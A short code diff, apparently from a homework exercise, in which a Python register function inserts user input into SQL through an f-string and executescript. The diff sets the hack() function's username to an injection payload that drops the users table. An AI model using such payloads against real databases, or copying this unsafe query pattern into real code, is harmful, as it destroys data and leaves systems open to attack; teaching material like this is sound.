@@ -4,6 +4,16 @@ import sqlite3
 def register(username: str, password: str) -> None:
     with sqlite3.connect('../homework.db') as conn:
         cursor = conn.cursor()
+
+        # # For testing:
+        # cursor.execute("""
+        #     CREATE TABLE IF NOT EXISTS `table_users` (
+        #         id INTEGER PRIMARY KEY,
+        #         username VARCHAR,
+        #         password VARCHAR
+        #     );
+        # """)
+
         cursor.executescript(
             f"""
             INSERT INTO `table_users` (username, password)
@@ -14,8 +24,8 @@ def register(username: str, password: str) -> None:
 
 
 def hack() -> None:
-    username: str = "I like"
-    password: str = "SQL Injection"
+    username: str = "', ''); DROP TABLE `table_users`; --"
+    password: str = ""
     register(username, password)
 
 
